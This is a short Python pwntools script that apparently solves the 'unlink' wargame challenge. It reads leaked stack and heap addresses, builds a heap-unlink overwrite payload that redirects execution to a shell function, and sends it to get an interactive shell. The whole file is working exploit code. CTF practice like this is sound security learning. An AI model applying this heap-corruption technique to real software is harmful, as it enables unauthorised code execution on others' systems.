from pwn import *
import struct

SHELL = struct.pack("I", 0x80484eb)

s = process('/home/unlink/unlink')
stack = s.recvline()[28:]
print stack
stack = int(stack, 16)
RET_PLUS_4 = struct.pack("I", stack + 4*4) #RET+4 = P -> BK

heap = s.recvline()[27:]
print heap
heap = int(heap, 16)
NEW_RET = struct.pack("I", heap + 8 + 4) #NEW_RET = P -> FD, +4 because of P -> BK is RET "+4" ## Note: maybe [heap + 8 + 4] -> [heap + 20 + 4]

padding = SHELL*4
#payload = padding + RET + TARGET
payload = padding + NEW_RET + RET_PLUS_4 + SHELL

print s.recvline()
print repr('payload: ' + payload)
raw_input('[ENTER] to send payload!')
s.sendline(payload)
s.interactive()


